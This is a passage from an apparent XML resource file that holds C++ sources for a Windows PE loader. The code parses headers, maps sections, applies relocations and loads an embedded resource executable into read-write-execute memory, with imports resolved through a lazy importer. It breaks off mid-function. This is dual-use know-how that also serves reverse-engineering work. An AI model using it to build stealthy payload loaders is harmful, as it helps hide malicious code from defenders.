    <value>#include "pe_hdrs_helper.h"
#include "pe_helper.h"
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include "lib/lazy_importer.hpp"


BYTE* get_nt_hdrs(IN const BYTE *pe_buffer, IN OPTIONAL size_t buffer_size)
{
    if (!pe_buffer) return nullptr;

    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (buffer_size != 0) {
        if (!validate_ptr((LPVOID)pe_buffer, buffer_size, (LPVOID)idh, sizeof(IMAGE_DOS_HEADER))) {
            return nullptr;
        }
    }
    else {
        if (is_bad_read_ptr(idh, sizeof(IMAGE_DOS_HEADER))) {
            return nullptr;
        }
    }
    if (idh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh-&gt;e_lfanew;

    if (pe_offset &gt; kMaxOffset) return nullptr;

    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
    if (buffer_size != 0) {
        if (!validate_ptr((LPVOID)pe_buffer, buffer_size, (LPVOID)inh, sizeof(IMAGE_NT_HEADERS32))) {
            return nullptr;
        }
    }
    else {
        if (is_bad_read_ptr(inh, sizeof(IMAGE_NT_HEADERS32))) {
            return nullptr;
        }
    }

    if (inh-&gt;Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }
    return (BYTE*)inh;
}

WORD get_nt_hdr_architecture(IN const BYTE* pe_buffer)
{
    void* ptr = get_nt_hdrs(pe_buffer);
    if (!ptr) return 0;

    IMAGE_NT_HEADERS32* inh = static_cast&lt;IMAGE_NT_HEADERS32*&gt;(ptr);
    if (is_bad_read_ptr(inh, sizeof(IMAGE_NT_HEADERS32))) {
        return 0;
    }
    return inh-&gt;OptionalHeader.Magic;
}

bool is_mem_accessible(LPCVOID areaStart, SIZE_T areaSize, DWORD dwAccessRights)
{
    if (!areaSize) return false; // zero-sized areas are not allowed

    const DWORD dwForbiddenArea = PAGE_GUARD | PAGE_NOACCESS;

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    const size_t mbiSize = sizeof(MEMORY_BASIC_INFORMATION);

    SIZE_T sizeToCheck = areaSize;
    LPCVOID areaPtr = areaStart;

    while (sizeToCheck &gt; 0) {
        //reset area
        memset(&amp;mbi, 0, mbiSize);

        // query the next area
        if (LI_FN(VirtualQuery)(areaPtr, &amp;mbi, mbiSize) != mbiSize) {
            return false; // could not query the area, assume it is bad
        }
        // check the privileges
        bool isOk = (mbi.State &amp; MEM_COMMIT) // memory allocated and
            &amp;&amp; !(mbi.Protect &amp; dwForbiddenArea) // access to page allowed and
            &amp;&amp; (mbi.Protect &amp; dwAccessRights); // the required rights
        if (!isOk) {
            return false; //invalid access
        }
        SIZE_T offset = (ULONG_PTR)areaPtr - (ULONG_PTR)mbi.BaseAddress;
        SIZE_T queriedSize = mbi.RegionSize - offset;
        if (queriedSize &gt;= sizeToCheck) {
            return true; // it is fine
        }
        // move to the next region
        sizeToCheck -= queriedSize;
        areaPtr = LPCVOID((ULONG_PTR)areaPtr + queriedSize);
    }
    // by default assume it is inaccessible
    return false;
}


bool is_bad_read_ptr(LPCVOID areaStart, SIZE_T areaSize)
{
#ifdef USE_OLD_BADPTR // classic IsBadReadPtr is much faster than the version using VirtualQuery
    return (IsBadReadPtr(areaStart, areaSize)) ? true : false;
#else
    const DWORD dwReadRights = PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;
    bool isAccessible = is_mem_accessible(areaStart, areaSize, dwReadRights);
    if (isAccessible) {
        // the area has read access rights: not a bad read pointer
        return false;
    }
    return true;
#endif
}


IMAGE_DATA_DIRECTORY* get_directory_entry(IN const BYTE *pe_buffer, IN DWORD dir_id, IN bool allow_empty)
{
    if (dir_id &gt;= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return nullptr;

    BYTE* nt_headers = get_nt_hdrs((BYTE*)pe_buffer);
    if (!nt_headers) return nullptr;

    IMAGE_DATA_DIRECTORY* peDir = nullptr;
    if (is64bit(pe_buffer)) {
        IMAGE_NT_HEADERS64* nt_headers64 = (IMAGE_NT_HEADERS64*)nt_headers;
        peDir = &amp;(nt_headers64-&gt;OptionalHeader.DataDirectory[dir_id]);
    }
    else {
        IMAGE_NT_HEADERS32* nt_headers64 = (IMAGE_NT_HEADERS32*)nt_headers;
        peDir = &amp;(nt_headers64-&gt;OptionalHeader.DataDirectory[dir_id]);
    }
    if (!allow_empty &amp;&amp; !peDir-&gt;VirtualAddress) {
        return nullptr;
    }
    return peDir;
}

bool update_image_base(IN OUT BYTE* payload, IN ULONGLONG destImageBase)
{
    bool is64b = is64bit(payload);
    BYTE* payload_nt_hdr = get_nt_hdrs(payload);
    if (!payload_nt_hdr) {
        return false;
    }
    if (is64b) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        payload_nt_hdr64-&gt;OptionalHeader.ImageBase = (ULONGLONG)destImageBase;
    }
    else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        payload_nt_hdr32-&gt;OptionalHeader.ImageBase = (DWORD)destImageBase;
    }
    return true;
}


WORD get_subsystem(IN const BYTE* payload)
{
    if (!payload) return 0;

    BYTE* payload_nt_hdr = get_nt_hdrs(payload);
    if (!payload_nt_hdr) {
        return 0;
    }
    const bool is64b = is64bit(payload);
    if (is64b) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        return payload_nt_hdr64-&gt;OptionalHeader.Subsystem;
    } else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        return payload_nt_hdr32-&gt;OptionalHeader.Subsystem;
    }
}


size_t get_sections_count(IN const BYTE* payload, IN const size_t buffer_size)
{
    const IMAGE_FILE_HEADER* fileHdr = get_file_hdr(payload, buffer_size);
    if (!fileHdr) {
        return 0;
    }
    return fileHdr-&gt;NumberOfSections;
}


const IMAGE_FILE_HEADER* get_file_hdr(IN const BYTE* payload, IN const size_t buffer_size)
{
    if (!payload) return nullptr;

    BYTE* payload_nt_hdr = get_nt_hdrs(payload, buffer_size);
    if (!payload_nt_hdr) {
        return nullptr;
    }
    if (is64bit(payload)) {
        return fetch_file_hdr(payload, buffer_size, (IMAGE_NT_HEADERS64*)payload_nt_hdr);
    }
    return fetch_file_hdr(payload, buffer_size, (IMAGE_NT_HEADERS32*)payload_nt_hdr);
}



template &lt;typename IMAGE_NT_HEADERS_T&gt;
inline const IMAGE_FILE_HEADER* fetch_file_hdr(IN const BYTE* payload, IN const size_t buffer_size, IN const IMAGE_NT_HEADERS_T *payload_nt_hdr)
{
    if (!payload || !payload_nt_hdr) return nullptr;

    const IMAGE_FILE_HEADER *fileHdr = &amp;(payload_nt_hdr-&gt;FileHeader);

    if (!validate_ptr((const LPVOID)payload, buffer_size, (const LPVOID)fileHdr, sizeof(IMAGE_FILE_HEADER))) {
        return nullptr;
    }
    return fileHdr;
}




ULONGLONG get_image_base(IN const BYTE *pe_buffer)
{
    bool is64b = is64bit(pe_buffer);
    //update image base in the written content:
    BYTE* payload_nt_hdr = get_nt_hdrs(pe_buffer);
    if (!payload_nt_hdr) {
        return 0;
    }
    ULONGLONG img_base = 0;
    if (is64b) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        img_base = payload_nt_hdr64-&gt;OptionalHeader.ImageBase;
    } else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        img_base = static_cast&lt;ULONGLONG&gt;(payload_nt_hdr32-&gt;OptionalHeader.ImageBase);
    }
    return img_base;
}


DWORD get_image_size(IN const BYTE *payload)
{
    if (!get_nt_hdrs(payload)) {
        return 0;
    }
    DWORD image_size = 0;
    if (is64bit(payload)) {
        IMAGE_NT_HEADERS64* nt64 = get_nt_hdrs64(payload);
        image_size = nt64-&gt;OptionalHeader.SizeOfImage;
    } else {
        IMAGE_NT_HEADERS32* nt32 = get_nt_hdrs32(payload);
        image_size = nt32-&gt;OptionalHeader.SizeOfImage;
    }
    return image_size;
}


IMAGE_NT_HEADERS32* get_nt_hdrs32(IN const BYTE *payload)
{
    if (!payload) return nullptr;

    BYTE *ptr = get_nt_hdrs(payload);
    if (!ptr) return nullptr;

    if (!is64bit(payload)) {
        return (IMAGE_NT_HEADERS32*)ptr;
    }
    return nullptr;
}

IMAGE_NT_HEADERS64* get_nt_hdrs64(IN const BYTE *payload)
{
    if (payload == nullptr) return nullptr;

    BYTE *ptr = get_nt_hdrs(payload);
    if (!ptr) return nullptr;

    if (is64bit(payload)) {
        return (IMAGE_NT_HEADERS64*)ptr;
    }
    return nullptr;
}


bool has_relocations(IN const BYTE *pe_buffer)
{
    IMAGE_DATA_DIRECTORY* relocDir = get_directory_entry(pe_buffer, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (!relocDir) {
        return false;
    }
    return true;
}</value>
  </data>
  <data name="pe_hdrs_helper.h" xml:space="preserve">
    <value>/**
* @file
* @brief   Wrappers over various fields in the PE header. Read, write, parse PE headers.
*/

#pragma once

#include &lt;windows.h&gt;
#include "buffer_util.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif


    /**
    Maximal size of the PE header.
    */
    const ULONGLONG MAX_HEADER_SIZE = PAGE_SIZE;

    template &lt;typename INT_TYPE&gt;
    INT_TYPE round_up_to_unit(const INT_TYPE size, const INT_TYPE unit)
    {
        if (unit == 0) {
            return size;
        }
        INT_TYPE units_count = size / unit;
        INT_TYPE rounded_size = units_count * unit;
        if (rounded_size &lt; size) {
            rounded_size += unit;
        }
        return rounded_size;
    }

    /**
    Fetch image size from headers.
    */
    DWORD get_image_size(IN const BYTE* payload);

    /**
    Change the Image Size in Optional Header to the given one.
    */
    bool update_image_size(IN OUT BYTE* payload, IN DWORD new_img_size);

    /**
    Fetch architecture from the NT headers. Checks for bad pointers.
    */
    WORD get_nt_hdr_architecture(IN const BYTE* pe_buffer);

    /**
    Wrapper for get_nt_hdr_architecture. Returns true if the PE file is 64 bit.
    */
    bool is64bit(IN const BYTE* pe_buffer);

    /**
    Fetch pointer to the NT headers of the PE file.
    Checks for bad pointers. If buffer_size is set, validates pointers against the buffer size.
    */
    BYTE* get_nt_hdrs(
        IN const BYTE* pe_buffer,
        IN OPTIONAL size_t buffer_size = 0 //if buffer_size=0 means size unknown
    );

    /**
    Wrapper for get_nt_headers. Automatically detects if the PE is 32 bit - if not, returns null pointer.
    */
    IMAGE_NT_HEADERS32* get_nt_hdrs32(IN const BYTE* pe_buffer);

    /**
    Wrapper for get_nt_headers. Automatically detects if the PE is 64 bit - if not, returns null pointer.
    */
    IMAGE_NT_HEADERS64* get_nt_hdrs64(IN const BYTE* pe_buffer);

    /**
    Fetches optional header of the PE. Validates pointers against buffer size.
    */
    LPVOID get_optional_hdr(IN const BYTE* payload, IN const size_t buffer_size);

    /**
    Fetches file header of the PE. Validates pointers against buffer size.
    */
    const IMAGE_FILE_HEADER* get_file_hdr(
        IN const BYTE* payload,
        IN const size_t buffer_size
    );
    /**
    Fetch the size of headers (from Optional Header).
    */
    DWORD get_hdrs_size(IN const BYTE* pe_buffer);

    /**
    get Data Directory entry of the given number. If the entry is not filled and allow_empty is not set, it returns null pointer.
    */
    IMAGE_DATA_DIRECTORY* get_directory_entry(IN const BYTE* pe_buffer, IN DWORD dir_id, IN bool allow_empty = false);

    /**
    Get pointer to the Data Directory content of the given number. Automatically cast to the chosen type.
    */
    template &lt;typename IMAGE_TYPE_DIRECTORY&gt;
    IMAGE_TYPE_DIRECTORY* get_type_directory(IN HMODULE modulePtr, IN DWORD dir_id)
    {
        IMAGE_DATA_DIRECTORY* my_dir = get_directory_entry((const BYTE*)modulePtr, dir_id);
        if (!my_dir) return nullptr;

        DWORD dir_addr = my_dir-&gt;VirtualAddress;
        if (dir_addr == 0) return nullptr;

        return (IMAGE_TYPE_DIRECTORY*)(dir_addr + (ULONG_PTR)modulePtr);
    }

    /**
    Get pointer to the Export Directory.
    */
    IMAGE_EXPORT_DIRECTORY* get_export_directory(IN HMODULE modulePtr);

    // Fetch Image Base from Optional Header.
    ULONGLONG get_image_base(IN const BYTE* pe_buffer);

    /**
    Change the Image Base in Optional Header to the given one.
    */
    bool update_image_base(IN OUT BYTE* payload, IN ULONGLONG destImageBase);

    /**
    Get RVA of the Entry Point from the Optional Header.
    */
    DWORD get_entry_point_rva(IN const BYTE* pe_buffer);

    /**
    Change the Entry Point RVA in the Optional Header to the given one.
    */
    bool update_entry_point_rva(IN OUT BYTE* pe_buffer, IN DWORD ep);

    /**
    Get number of sections from the File Header. It does not validate if this the actual number.
    */
    size_t get_sections_count(
        IN const BYTE* buffer,
        IN const size_t buffer_size
    );

    /**
    Checks if the section headers are reachable. It does not validate sections alignment.
    */
    bool is_valid_sections_hdr_offset(IN const BYTE* buffer, IN const size_t buffer_size);

    /**
    Gets pointer to the section header of the given number.
    */
    PIMAGE_SECTION_HEADER get_section_hdr(
        IN const BYTE* pe_buffer,
        IN const size_t buffer_size,
        IN size_t section_num
    );

    /**
    Fetch the PE Characteristics from the File Header.
    */
    WORD get_file_characteristics(IN const BYTE* payload);

    /**
    Check if the module is a DLL (basing on the Characteristcs in the header).
    */
    bool is_module_dll(IN const BYTE* payload);

    /**
    Check if the module is a .NET executable
    */
    bool is_dot_net(BYTE* pe_buffer, size_t pe_buffer_size);

    /**
    Fetch the DLL Characteristics from the Optional Header.
    */
    WORD get_dll_characteristics(IN const BYTE* payload);

    /**
    Set the PE subsystem in the header.
    */
    bool set_subsystem(IN OUT BYTE* payload, IN WORD subsystem);

    /**
    Get the PE subsystem from the header.
    */
    WORD get_subsystem(IN const BYTE* payload);

    /**
    Check if the PE has relocations Data Directory.
    */
    bool has_relocations(IN const BYTE* pe_buffer);

    /**
    Fetch the pointer to the .NET header (if exist).
    */
    IMAGE_COR20_HEADER* get_dotnet_hdr(
        IN const BYTE* pe_buffer,
        IN size_t const buffer_size,
        IN const IMAGE_DATA_DIRECTORY* dotNetDir
    );

    /**
    Fetch section aligmenent from headers. Depending on the flag, it fetches either Raw Alignment or Virtual Alignment.
    */
    DWORD get_sec_alignment(IN const BYTE* modulePtr, IN bool is_raw);

    /**
    Change section aligmenent in headers. Depending on the flag, it sets either Raw Alignment or Virtual Alignment.
    */
    bool set_sec_alignment(IN OUT BYTE* pe_buffer, IN bool is_raw, IN DWORD new_alignment);

    /**
    Get size of virtual section from the headers (optionaly rounds it up to the Virtual Alignment)
    */
    DWORD get_virtual_sec_size(
        IN const BYTE* pe_hdr,
        IN const PIMAGE_SECTION_HEADER sec_hdr,
        IN bool rounded //if set, it rounds it up to the Virtual Alignment
    );

    /**
    Get the last section (in a raw or virtual alignment)
    \param pe_buffer : buffer with a PE
    \param pe_size : size of the given PE
    \param is_raw : If true, give the section with the highest Raw offset. If false, give the section with the highest Virtual offset.
    */
    PIMAGE_SECTION_HEADER get_last_section(IN const PBYTE pe_buffer, IN size_t pe_size, IN bool is_raw);

    /**
    Calculate full PE size (raw or virtual) using information from sections' headers. WARNING: it drops an overlay.
    \param pe_buffer : a buffer containing a PE
    \param pe_size : the size of the given buffer
    \param is_raw : If true, the Raw alignment is used. If false, the Virtual alignment is used.
    */
    DWORD calc_pe_size(
        IN const PBYTE pe_buffer,
        IN size_t pe_size,
        IN bool is_raw
    );

    /**
    Walk through sections headers checking if the sections beginnings and sizes are fitting the alignment (Virtual or Raw)
    \param buffer : a buffer containing a PE
    \param buffer_size : the size of the given buffer
    \param is_raw : If true, the Raw alignment is checked. If false, the Virtual alignment is checked.
    */
    bool is_valid_sectons_alignment(IN const BYTE* buffer, IN const SIZE_T buffer_size, IN bool is_raw);


    bool is_bad_read_ptr(LPCVOID areaStart, SIZE_T areaSize);

    template &lt;typename IMAGE_NT_HEADERS_T&gt;
    inline const IMAGE_FILE_HEADER* fetch_file_hdr(IN const BYTE* payload, IN const size_t buffer_size, IN const IMAGE_NT_HEADERS_T* payload_nt_hdr);</value>
  </data>
  <data name="pe_helper.cpp" xml:space="preserve">
    <value>#include "pe_helper.h"
#include "pe_hdrs_helper.h"



DWORD get_entry_point_rva(IN const BYTE *pe_buffer)
{
    //update image base in the written content:
    BYTE* payload_nt_hdr = get_nt_hdrs(pe_buffer);
    if (!payload_nt_hdr) {
        return 0;
    }
    const bool is64b = is64bit(pe_buffer);
    DWORD value = 0;
    if (is64b) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        value = payload_nt_hdr64-&gt;OptionalHeader.AddressOfEntryPoint;
    } else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        value = payload_nt_hdr32-&gt;OptionalHeader.AddressOfEntryPoint;
    }
    return value;
}

bool is64bit(IN const BYTE *pe_buffer)
{
    WORD arch = get_nt_hdr_architecture(pe_buffer);
    if (arch == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return true;
    }
    return false;
}</value>
  </data>
  <data name="pe_helper.h" xml:space="preserve">
    <value>#pragma once

#include &lt;windows.h&gt;

DWORD get_entry_point_rva(IN const BYTE *pe_buffer);

bool is64bit(IN const BYTE *pe_buffer);</value>
  </data>
  <data name="pe_loader.cpp" xml:space="preserve">
    <value>#include "pe_loader.h"
#include "pe_hdrs_helper.h"
#include "pe_helper.h"
#include "relocate.h"
#include "buffer_util.h"
#include "pe_raw_to_virtual.h"
#include "file_util.h"

BYTE* load_no_sec_pe(BYTE* dllRawData, size_t r_size, OUT size_t &amp;v_size, bool executable)
{
    ULONG_PTR desired_base = 0;
    size_t out_size = (r_size &lt; PAGE_SIZE) ? PAGE_SIZE : r_size;
    if (executable) {
        desired_base = get_image_base(dllRawData);
        out_size = get_image_size(dllRawData);
    }
    DWORD protect = (executable) ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
    BYTE* mappedPE = alloc_pe_buffer(out_size, protect, reinterpret_cast&lt;void*&gt;(desired_base));
    if (!mappedPE) {
        return nullptr;
    }
    memcpy(mappedPE, dllRawData, r_size);
    v_size = out_size;
    return mappedPE;
}

BYTE* load_pe_module(BYTE* dllRawData, size_t r_size, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base)
{
    if (!get_nt_hdrs(dllRawData, r_size)) {
        return nullptr;
    }
    if (get_sections_count(dllRawData, r_size) == 0) {
        return load_no_sec_pe(dllRawData, r_size, v_size, executable);
    }
    // by default, allow to load the PE at the supplied base
    // if relocating is required, but the PE has no relocation table...
    if (relocate &amp;&amp; !has_relocations(dllRawData)) {
        // ...enforce loading the PE image at its default base (so that it will need no relocations)
        desired_base = get_image_base(dllRawData);
    }
    // load a virtual image of the PE file at the desired_base address (random if desired_base is NULL):
    BYTE *mappedDLL = pe_raw_to_virtual(dllRawData, r_size, v_size, executable, desired_base);
    if (mappedDLL) {
        //if the image was loaded at its default base, relocate_module will return always true (because relocating is already done)
        if (relocate &amp;&amp; !relocate_module(mappedDLL, v_size, (ULONGLONG)mappedDLL)) {
            // relocating was required, but it failed - thus, the full PE image is useless
            std::cerr &lt;&lt; "[!] Could not relocate the module!\n";
            free_pe_buffer(mappedDLL, v_size);
            mappedDLL = nullptr;
        }
    } else {
        std::cerr &lt;&lt; "[!] Could not allocate memory at the desired base!\n";
    }
    return mappedDLL;
}

BYTE* load_pe_module(LPCTSTR filename, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base)
{
    size_t r_size = 0;
    BYTE *dllRawData = load_file(filename, r_size);
    if (!dllRawData) {
#ifdef _DEBUG
        std::cerr &lt;&lt; "Cannot load the file: " &lt;&lt; filename &lt;&lt; std::endl;
#endif
        return nullptr;
    }
    BYTE* mappedPE = load_pe_module(dllRawData, r_size, v_size, executable, relocate, desired_base);
    free_file(dllRawData);
    return mappedPE;
}


BYTE* load_pe_module_r(WORD resourcename, OUT size_t&amp; v_size, bool executable,bool relocate, ULONG_PTR desired_base )
{
    // Load resource data.
    size_t r_size =  0;
    BYTE* dllRawData = load_embedded_resource(resourcename, r_size);
    if (!dllRawData) { return nullptr; }

    BYTE* mappedPE = load_pe_module(dllRawData, r_size, v_size, executable, relocate, desired_base);

    delete[] dllRawData;  // Remember to free allocated memory for raw data after usage.
    // The `load_file` function does not allocate any memory.

    return mappedPE;
}
</value>
  </data>
  <data name="pe_loader.h" xml:space="preserve">
    <value>#pragma once
#include &lt;windows.h&gt;
#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;vector&gt;
#include &lt;fstream&gt;
#include &lt;cstddef&gt;
#include &lt;cstdint&gt;
#include &lt;cstring&gt;

    BYTE* load_pe_module(BYTE* payload_raw, size_t r_size, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base = 0);

    BYTE* load_pe_module(LPCTSTR filename, OUT size_t &amp;v_size, bool executable, bool relocate, ULONG_PTR desired_base = 0);

    BYTE* load_pe_module_r(WORD resourcename, OUT size_t&amp; v_size, bool executable = true,
        bool relocate = false, ULONG_PTR desired_base = 0);</value>
  </data>
  <data name="pe_raw_to_virtual.cpp" xml:space="preserve">
    <value>#include "pe_raw_to_virtual.h"
#include "pe_hdrs_helper.h"
#include "buffer_util.h"
#include &lt;iostream&gt;
#include "pe_helper.h"

// Map raw PE into virtual memory of local process:
bool sections_raw_to_virtual(IN const BYTE* payload, IN SIZE_T payloadSize, OUT BYTE* destBuffer, IN SIZE_T destBufferSize)
{
    if (!payload || !destBuffer) return false;

    BYTE* payload_nt_hdr = get_nt_hdrs(payload, payloadSize);
    if (!payload_nt_hdr) {
        std::cerr &lt;&lt; "Invalid PE: " &lt;&lt; std::hex &lt;&lt; (ULONGLONG) payload &lt;&lt; std::endl;
        return false;
    }

    const bool is64b = is64bit(payload);

    IMAGE_FILE_HEADER *fileHdr = nullptr;
    DWORD hdrsSize = 0;
    void* secptr = nullptr;
    if (is64b) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        fileHdr = &amp;(payload_nt_hdr64-&gt;FileHeader);
        hdrsSize = payload_nt_hdr64-&gt;OptionalHeader.SizeOfHeaders;
        secptr = (void*)((ULONG_PTR)&amp;(payload_nt_hdr64-&gt;OptionalHeader) + fileHdr-&gt;SizeOfOptionalHeader);
    }
    else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        fileHdr = &amp;(payload_nt_hdr32-&gt;FileHeader);
        hdrsSize = payload_nt_hdr32-&gt;OptionalHeader.SizeOfHeaders;
        secptr = (void*)((ULONG_PTR)&amp;(payload_nt_hdr32-&gt;OptionalHeader) + fileHdr-&gt;SizeOfOptionalHeader);
    }
    DWORD first_raw = 0;
    //copy all the sections, one by one:
    for (WORD i = 0; i &lt; fileHdr-&gt;NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER next_sec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)secptr + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!validate_ptr(static_cast&lt;const void*&gt;(payload), payloadSize, next_sec, IMAGE_SIZEOF_SECTION_HEADER) // check if fits in the source size
            || !validate_ptr(static_cast&lt;const void*&gt;(payload), destBufferSize, next_sec, IMAGE_SIZEOF_SECTION_HEADER)) // check if fits in the destination size
        {
            return false;
        }
        if (next_sec-&gt;PointerToRawData == 0 || next_sec-&gt;SizeOfRawData == 0) {
            continue; //skipping empty
        }
        void* section_mapped = destBuffer + next_sec-&gt;VirtualAddress;
        void* section_raw_ptr = (BYTE*)payload +  next_sec-&gt;PointerToRawData;
        size_t sec_size = next_sec-&gt;SizeOfRawData;
        
        if ((next_sec-&gt;VirtualAddress + sec_size) &gt; destBufferSize) {
            std::cerr &lt;&lt; "[!] Virtual section size is out ouf bounds: " &lt;&lt; std::hex &lt;&lt; sec_size &lt;&lt; std::endl;
            sec_size = (destBufferSize &gt; next_sec-&gt;VirtualAddress) ? SIZE_T(destBufferSize - next_sec-&gt;VirtualAddress) : 0;
            std::cerr &lt;&lt; "[!] Truncated to maximal size: " &lt;&lt; std::hex &lt;&lt; sec_size &lt;&lt; ", buffer size:" &lt;&lt; destBufferSize &lt;&lt; std::endl;
        }
        if (next_sec-&gt;VirtualAddress &gt;= destBufferSize &amp;&amp; sec_size != 0) {
            std::cerr &lt;&lt; "[-] VirtualAddress of section is out ouf bounds: " &lt;&lt; std::hex &lt;&lt; next_sec-&gt;VirtualAddress &lt;&lt; std::endl;
            return false;
        }
        if (next_sec-&gt;PointerToRawData + sec_size &gt; destBufferSize) {
            std::cerr &lt;&lt; "[-] Raw section size is out ouf bounds: " &lt;&lt; std::hex &lt;&lt; sec_size &lt;&lt; std::endl;
            return false;
        }

        // validate source:
        if (!validate_ptr(static_cast&lt;const void*&gt;(payload), payloadSize, section_raw_ptr, sec_size)) {
            if (next_sec-&gt;PointerToRawData &gt; payloadSize) {
                std::cerr &lt;&lt; "[-] Section " &lt;&lt; i &lt;&lt; ":  out ouf bounds, skipping... " &lt;&lt; std::endl;
                continue;
            }
            // trim section
            sec_size = payloadSize - (next_sec-&gt;PointerToRawData);
        }
        // validate destination:
        if (!validate_ptr(destBuffer, destBufferSize, section_mapped, sec_size)) {
            std::cerr &lt;&lt; "[-] Section " &lt;&lt; i &lt;&lt; ":  out ouf bounds, skipping... " &lt;&lt; std::endl;
            continue;
        }
        memcpy(section_mapped, section_raw_ptr, sec_size);
        if (first_raw == 0 || (next_sec-&gt;PointerToRawData &lt; first_raw)) {
            first_raw = next_sec-&gt;PointerToRawData;
        }
    }

    //copy payload's headers:
    if (hdrsSize == 0) {
        hdrsSize= first_raw;
#ifdef _DEBUG
        std::cout &lt;&lt; "hdrsSize not filled, using calculated size: " &lt;&lt; std::hex &lt;&lt; hdrsSize &lt;&lt; "\n";
#endif
    }
    if (!validate_ptr((const LPVOID)payload, destBufferSize, (const LPVOID)payload, hdrsSize)) {
        return false;
    }
    memcpy(destBuffer, payload, hdrsSize);
    return true;
}

BYTE* pe_raw_to_virtual(
    IN const BYTE* payload,
    IN size_t in_size,
    OUT size_t &amp;out_size,
    IN OPTIONAL bool executable,
    IN OPTIONAL ULONG_PTR desired_base
)
{
    //check payload:
    BYTE* nt_hdr = get_nt_hdrs(payload);
    if (!nt_hdr) {
        std::cerr &lt;&lt; "Invalid PE: " &lt;&lt; std::hex &lt;&lt; (ULONG_PTR) payload &lt;&lt; std::endl;
        return nullptr;
    }
    DWORD payloadImageSize = 0;

    const bool is64 = is64bit(payload);
    if (is64) {
        IMAGE_NT_HEADERS64* payload_nt_hdr = (IMAGE_NT_HEADERS64*)nt_hdr;
        payloadImageSize = payload_nt_hdr-&gt;OptionalHeader.SizeOfImage;
    }
    else {
        IMAGE_NT_HEADERS32* payload_nt_hdr = (IMAGE_NT_HEADERS32*)nt_hdr;
        payloadImageSize = payload_nt_hdr-&gt;OptionalHeader.SizeOfImage;
    }
    payloadImageSize = round_up_to_unit(payloadImageSize, (DWORD)PAGE_SIZE);

    DWORD protect = executable ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
    //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
    //when it will be ready, we will copy it into the space reserved in the target process
    BYTE* localCopyAddress = alloc_pe_buffer(payloadImageSize, protect, reinterpret_cast&lt;void*&gt;(desired_base));
    if (!localCopyAddress) {
        std::cerr &lt;&lt; "Could not allocate memory in the current process" &lt;&lt; std::endl;
        return NULL;
    }
    //printf("Allocated local memory: %p size: %x\n", localCopyAddress, payloadImageSize);
    if (!sections_raw_to_virtual(payload, in_size, localCopyAddress, payloadImageSize)) {
        std::cerr &lt;&lt;  "Could not copy PE file" &lt;&lt; std::endl;
        return nullptr;
    }
    out_size = payloadImageSize;
    return localCopyAddress;
}
</value>
  </data>
  <data name="pe_raw_to_virtual.h" xml:space="preserve">
    <value>#pragma once
#include &lt;windows.h&gt;


    BYTE* pe_raw_to_virtual(
        IN const BYTE* rawPeBuffer,
        IN size_t rawPeSize,
        OUT size_t &amp;outputSize,
        IN OPTIONAL bool executable = true,
        IN OPTIONAL ULONG_PTR desired_base = 0
    );</value>
  </data>
  <data name="relocate.cpp" xml:space="preserve">
    <value>#include "relocate.h"
#include "pe_helper.h"
#include "pe_hdrs_helper.h"
#include &lt;iostream&gt;

class ApplyRelocCallback : public RelocBlockCallback
{
public:
    ApplyRelocCallback(bool _is64bit, ULONGLONG _oldBase, ULONGLONG _newBase)
        : RelocBlockCallback(_is64bit), oldBase(_oldBase), newBase(_newBase)
    {
    }

    virtual bool processRelocField(ULONG_PTR relocField)
    {
        if (is64bit) {
            ULONGLONG* relocateAddr = (ULONGLONG*)((ULONG_PTR)relocField);
            ULONGLONG rva = (*relocateAddr) - oldBase;
            (*relocateAddr) = rva + newBase;
        }
        else {
            DWORD* relocateAddr = (DWORD*)((ULONG_PTR)relocField);
            ULONGLONG rva = ULONGLONG(*relocateAddr) - oldBase;
            (*relocateAddr) = static_cast&lt;DWORD&gt;(rva + newBase);
        }
        return true;
    }

protected:
    ULONGLONG oldBase;
    ULONGLONG newBase;
};


bool process_relocation_table(IN PVOID modulePtr, IN SIZE_T moduleSize, IN RelocBlockCallback *callback)
{
